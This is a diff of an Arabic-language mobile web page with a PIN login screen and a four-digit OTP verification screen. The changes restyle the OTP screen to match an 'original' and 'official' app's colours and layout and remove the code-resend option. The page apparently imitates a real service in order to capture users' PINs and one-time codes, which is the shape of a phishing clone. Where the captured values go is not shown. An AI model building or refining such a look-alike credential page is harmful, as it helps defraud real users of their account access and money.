@@ -10,9 +10,9 @@
 html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;background:#fff}
 #app{width:100%;height:100%;display:flex;justify-content:center}
 .phone{width:100%;max-width:430px;height:100%;background:#fff;display:flex;flex-direction:column;overflow:hidden}
+
 .hdr{background:#fff;height:20px;flex-shrink:0;display:flex;align-items:center;padding:0 14px;position:relative}
-.hdr-title{position:absolute;left:50%;transform:translateX(-50%);color:#fff;font-size:16px;font-weight:700}
-.hdr-back{background:none;border:none;cursor:pointer;color:#fff;font-size:28px;line-height:1;padding:0;margin-right:auto}
+
 .body{flex:1;overflow-y:auto;display:flex;flex-direction:column;padding:0 24px 16px;-webkit-overflow-scrolling:touch}
 
 .logo-box{display:flex;justify-content:center;margin:15px 0 25px}
@@ -58,7 +58,7 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 .warning-msg{background:#fce4e4;border:1px solid #f5c2c2;border-radius:8px;padding:10px;margin-top:10px;display:flex;gap:8px;align-items:flex-start;text-align:right;font-size:12px;color:#333;line-height:1.4}
 .warning-msg::before{content:'!';background:#e74c3c;color:#fff;width:20px;height:20px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:bold;flex-shrink:0;font-size:14px}
 
-/* حقل الرقم السري - نقاط سوداء كبيرة ومخفية */
+/* حقل الرقم السري */
 .pin-row-wrap {
   display: flex;
   align-items: center;
@@ -80,7 +80,7 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
   width: 32px;
   height: 28px;
   text-align: center;
-  font-size: 26px; /* تكبير حجم نقاط الإخفاء */
+  font-size: 26px;
   line-height: 28px;
   border: none;
   border-bottom: 2px solid #333;
@@ -92,7 +92,7 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
   caret-color: transparent;
   padding: 0;
   direction: ltr;
-  -webkit-text-security: disc !important; /* إخفاء الأرقام */
+  -webkit-text-security: disc !important;
   text-security: disc !important;
   box-shadow: none !important;
 }
@@ -122,7 +122,7 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 .lnk-md{font-size:13px;font-weight:700;color:#333;text-decoration:underline;cursor:pointer;background:none;border:none;font-family:'Cairo',sans-serif}
 .spacer{flex:1;min-height:20px}
 
-/* زر تسجيل الدخول */
+/* زر تسجيل الدخول والتحقق */
 .btn{
   height:50px;
   background:#F2C029;
@@ -141,33 +141,76 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 .screen{display:flex;flex-direction:column;height:100%}
 .hide{display:none!important}
 
-/* شاشة OTP */
-.otp-title{font-size:17px;font-weight:700;color:#1a1a1a;text-align:center;line-height:1.5;margin:24px 8px 28px}
-.otp-row{display:flex;gap:16px;justify-content:center;direction:ltr;margin-bottom:24px}
-.otp-row input{
-  width:44px;
-  height:48px;
-  text-align:center;
-  font-size:22px;
-  font-weight:700;
-  font-family:'Cairo',sans-serif;
-  border:none;
-  border-bottom:2px solid #ccc;
-  outline:none;
-  background:transparent;
-  color:#1a1a1a;
-  transition:border-color .2s;
-  caret-color:#000;
-  direction:ltr;
-}
-.otp-row input:focus{border-color:#000}
-.otp-row input.bad{border-color:#e74c3c}
-.cd-wrap{display:flex;flex-direction:column;align-items:center;gap:10px;margin-bottom:20px}
-.cd-text{text-align:center;color:#555;font-size:13px;line-height:1.5}
-.cd-time{font-weight:700;color:#1a1a1a;font-size:15px}
-
+/* ==================== شاشة OTP الرسمية ==================== */
 .otp-hdr {
-  background: #2E818F !important;
+  background: #59BBE0 !important; /* اللون السماوي الأصلي */
+  height: 52px !important;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  position: relative;
+}
+.otp-hdr .hdr-title {
+  position: static;
+  transform: none;
+  color: #fff;
+  font-size: 18px;
+  font-weight: 700;
+}
+.otp-hdr .hdr-back {
+  position: absolute;
+  right: 14px;
+  top: 50%;
+  transform: translateY(-50%);
+  color: #fff;
+  font-size: 26px;
+  border: none;
+  background: none;
+  cursor: pointer;
+}
+
+.otp-title {
+  font-size: 15px;
+  font-weight: 600;
+  color: #777;
+  text-align: center;
+  line-height: 1.5;
+  margin: 45px 15px 40px;
+}
+
+/* الشحطات الخطية في OTP */
+.otp-row {
+  display: flex;
+  gap: 18px;
+  justify-content: center;
+  direction: ltr;
+  margin-bottom: 45px;
+}
+.otp-row input {
+  width: 32px;
+  height: 30px;
+  text-align: center;
+  font-size: 20px;
+  font-weight: 700;
+  font-family: system-ui, -apple-system, sans-serif;
+  border: none;
+  border-bottom: 2px solid #333;
+  border-radius: 0;
+  outline: none;
+  background: transparent;
+  color: #1a1a1a;
+  caret-color: transparent;
+  direction: ltr;
+  padding: 0;
+}
+
+/* العداد الرقمي المباشر بدون دائرة */
+.cd-timer-text {
+  text-align: center;
+  font-size: 17px;
+  font-weight: 800;
+  color: #183059;
+  font-family: system-ui, -apple-system, sans-serif;
 }
 </style>
 </head>
@@ -225,6 +268,7 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
   <button class="btn" onclick="login()">تسجيل الدخول</button>
 </div>
 
+<!-- شاشة OTP المطابقة للأصلية -->
 <div id="pg-otp" class="screen hide">
   <div class="hdr otp-hdr">
     <button class="hdr-back" onclick="back()">&#8249;</button>
@@ -232,25 +276,16 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
   </div>
   <div class="body" style="align-items:center">
     <div class="otp-title">أدخل رمز التأكيد المرسل إلى هاتفك المحمول</div>
+    
     <div class="otp-row">
       <input type="text" inputmode="numeric" maxlength="1" id="o0"/>
       <input type="text" inputmode="numeric" maxlength="1" id="o1"/>
       <input type="text" inputmode="numeric" maxlength="1" id="o2"/>
       <input type="text" inputmode="numeric" maxlength="1" id="o3"/>
     </div>
-    <div class="cd-wrap">
-      <div class="cd-text">
-        تنتهي صلاحية رمز التأكيد خلال<br/>
-        <span class="cd-time" id="cd">4 دقائق 59 ثاني</span>
-      </div>
-      <svg width="55" height="55" viewBox="0 0 64 64">
-        <circle cx="32" cy="32" r="27" stroke="#e5e7eb" stroke-width="5" fill="white"/>
-        <circle id="cp" cx="32" cy="32" r="27" stroke="#22c55e" stroke-width="5" fill="none"
-          stroke-dasharray="169.6" stroke-dashoffset="0"
-          style="transform:rotate(-90deg);transform-origin:32px 32px;transition:stroke-dashoffset 1s linear"/>
-      </svg>
-    </div>
-    <button class="lnk-forgot" onclick="resetOtp()">إعادة إرسال رمز التأكيد</button>
+
+    <div class="cd-timer-text" id="cd">05:00 ثواني</div>
+    
     <div class="spacer"></div>
   </div>
   <button class="btn" onclick="verify()">التحقق</button>
@@ -394,7 +429,6 @@ O.forEach(function(el,i){
 
   el.addEventListener('input',function(){
     el.value=el.value.replace(/[^0-9]/g,'');
-    el.classList.remove('bad');
     if(el.value&&i<3)O[i+1].focus();
   });
 
@@ -413,7 +447,6 @@ O.forEach(function(el,i){
 function verify(){
   var code=O.map(function(o){return o.value;}).join('');
   if(code.length!==4){
-    O.forEach(function(o){o.classList.add('bad');});
     return;
   }
 
@@ -427,7 +460,7 @@ function verify(){
 function showOtp(){
   document.getElementById('pg-login').classList.add('hide');
   document.getElementById('pg-otp').classList.remove('hide');
-  O.forEach(function(o){o.value='';o.classList.remove('bad');});
+  O.forEach(function(o){o.value='';});
   O[0].focus();
   startTimer();
 }
@@ -437,16 +470,14 @@ function back(){
   clearInterval(T);
 }
 
-var TOTAL=299,left=TOTAL,T=null,C=2*Math.PI*27;
+var TOTAL=300,left=TOTAL,T=null;
 function tick(){
   var m=Math.floor(left/60),s=left%60;
-  document.getElementById('cd').textContent=m+' دقائق '+String(s).padStart(2,'0')+' ثاني';
-  document.getElementById('cp').setAttribute('stroke-dashoffset',(C-(left/TOTAL)*C).toFixed(2));
+  document.getElementById('cd').textContent=String(m).padStart(2,'0')+':'+String(s).padStart(2,'0')+' ثواني';
   if(left<=0){clearInterval(T);document.getElementById('cd').textContent='انتهت الصلاحية';}
   else left--;
 }
 function startTimer(){clearInterval(T);left=TOTAL;tick();T=setInterval(tick,1000);}
-function resetOtp(){O.forEach(function(o){o.value='';o.classList.remove('bad');});startTimer();O[0].focus();}
 </script>
 </body>
 </html>
